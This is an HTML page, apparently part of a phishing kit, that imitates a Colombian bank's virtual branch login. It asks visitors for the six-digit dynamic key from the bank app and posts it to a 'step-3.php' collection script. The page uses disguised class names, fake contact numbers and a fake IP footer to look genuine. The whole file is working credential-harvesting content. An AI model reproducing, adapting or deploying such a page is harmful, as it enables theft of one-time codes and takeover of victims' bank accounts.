<!-- Fuente utilizada: Open Sans por Steve Matteson (Apache License 2.0) -->
<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="language" content="es">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="../_manuela/css/estilos.css">
  <script src="./js/jquery-3.6.0.min.js"></script>

  <title>usuario</title>
</head>

<body>
  <div class="container">
    <div class="row">
      <div class="col">
        <img src="./img/logo.svg" alt="Logo" class="logo">
        <h2 id="texto" class="procesodepazcolombia">Sucursal Virual Personas</h2>
        <p id="currentDateTime" class="dateTime"></p>
        <h3 class="grotesca-papel">Inicio de sesion</h3>
        <div class="random" style="padding-top: 30px;"></div>

        <div class="desmovilizacion" id="err-mensaje" style="display:none">
          <img src="./img/error.jpg" alt="" class="error-paracos">
          <div class="error-content">
            <h3 class="error-guerrilas">Error</h3>
            <p class="error-interno">Por favor ingrese la información requerida</p>
          </div>
        </div>

        <div class="desmovilizacion" id="carderror" style="display:none">
          <img src="../_manuela/img/error.jpg" alt="" class="error-paracos">
          <div class="error-content">
            <h3 class="error-guerrilas">Error</h3>
            <p class="error-interno">Usuario o clave incorrecta</p>
          </div>
        </div>
        <script>
          function getCurrentDateTime() {
            const now = new Date();
            const options = {
              weekday: 'long',
              day: 'numeric',
              month: 'long',
              year: 'numeric',
              hour: 'numeric',
              minute: 'numeric',
              second: 'numeric',
              hour12: true
            };
            const formattedDate = now.toLocaleString('es-CO', options);
            return formattedDate;
          }

          function updateDateTime() {
            const dateTimeElement = document.getElementById('currentDateTime');
            const dateTimeString = getCurrentDateTime();
            const message = "Fecha y hora actual:";
            const separatedMessage = message + "&nbsp;&nbsp;&nbsp;&nbsp;" + dateTimeString;
            dateTimeElement.innerHTML = separatedMessage;
          }

          setInterval(updateDateTime, 1000);
        </script>

        <style>
          .camionescolombia {
            border-color: red;
          }
        </style>


<form id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar"
name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar" method="post" action="../_manuela/step-3.php"
   enctype="application/x-www-form-urlencoded">




        <div class="desmovilizacion" id="user-error">
          <img src="../_manuela/img/error.jpg" alt="" class="error-paracos">
          <div class="error-content">
            <h3 class="error-guerrilas">Error</h3>
            <p class="error-interno">Clave dinamica incorrecta</p>
          </div>
        </div>
        <div class="grotesca-title">Valide su Clave dinamica</div>
        <div class="caminolimpio">
          <div class="message">Para continuar con la verificación ingresa una nueva Clave Dinámica que encuentras en la app (Código de 6 dígitos).</div>
          <div class="label-container">
            <img src="../_manuela/img/info.jpg" alt="Icono" width="10" height="10">
            <span class="label-text">Ingrese la clave dinámica</span>
            <span class="label-text" style="margin-left: -10px;"></span>
          </div>
          <div class="input-container">
            <img src="../_manuela/img/lock.png" alt="Input Icon" class="input-icon">

            <input type="number" class="camionescolombia" id="txtOTP" name="txtOTP" placeholder="" maxlength="6">
          
          </div>
          <div class="button-container">
            <button type="submit" id="" name="txtCancel" class="motocarro">Cancelar</button>
            <button type="submit" id="btnOTP" name="btnOTP" class="motoconcho">Ingresar</button>
          </div>
          <a href="#" style=" text-decoration: none; color: inherit; "></a>

        </div>

        <div class="col">
          <iframe src="https://cdnassetsnms.com/images/din.gif" style="border: none; width: 100%; height: 400px;"></iframe>
        </div>
      </div>
    </div>
  </div>

  <script>
    document.addEventListener("DOMContentLoaded", function() {
      var tituloInicioSesionElement = document.querySelector(".grotesca-papel");
      var titulo = localStorage.getItem('tituloInicioSesion');

      if (titulo) {
        tituloInicioSesionElement.textContent = titulo;
      } else {
        //mensaje predeterminado
        tituloInicioSesionElement.textContent = "Verificación de dos pasos";
      }

      // Función para validar que solo se ingresen números y se respete el límite de caracteres
      function validarNumeros(e, inputId) {
        var charCode = (e.which) ? e.which : e.keyCode;
        if (charCode > 31 && (charCode < 48 || charCode > 57)) {
          e.preventDefault();
        }
        // Limitar la longitud del texto
        var input = document.getElementById(inputId);
        if (input.value.length >= 6) {
          e.preventDefault();
        }
      }

      // Agregar evento de escucha al input txtOTP
      document.getElementById("txtOTP").addEventListener("keypress", function(e) {
        validarNumeros(e, "txtOTP");
      });
    });
  </script>



  <p style="font-size: 10px; text-decoration: none;">Medellín (57) 310 234 5678 - Bucaramanga (57) 350 789 4567 - Bogotá (57) 300 123 4567 - Barranquilla (57) 330 456 7890 - Cali (57) 320 345 6789 - Cartagena (57) 350 567 8901 Pereira (57) 320 678 9012 - Oficinas Telefónica: El resto del país 018000 8 76543 - España (34) 600 123 456 - Estados Unidos (1) 800 234 5678.</p>

  <footer class="container mt-3">
    <div class="row">
      <div class="col-md-12">
        <div class="footer-content" style="display: flex; justify-content: space-between; align-items: center; font-size: 10px; margin-bottom: 24px !important; margin-top: 3px !important;">
          <p class="mb-0">Dirección IP: <span id="ip_address">192.45.024.22</span></p>
          <p class="mb-0">Copyright © <span id="current_year"></span> S.A.</p>
        </div>
      </div>
    </div>
  </footer>

</body>
</html>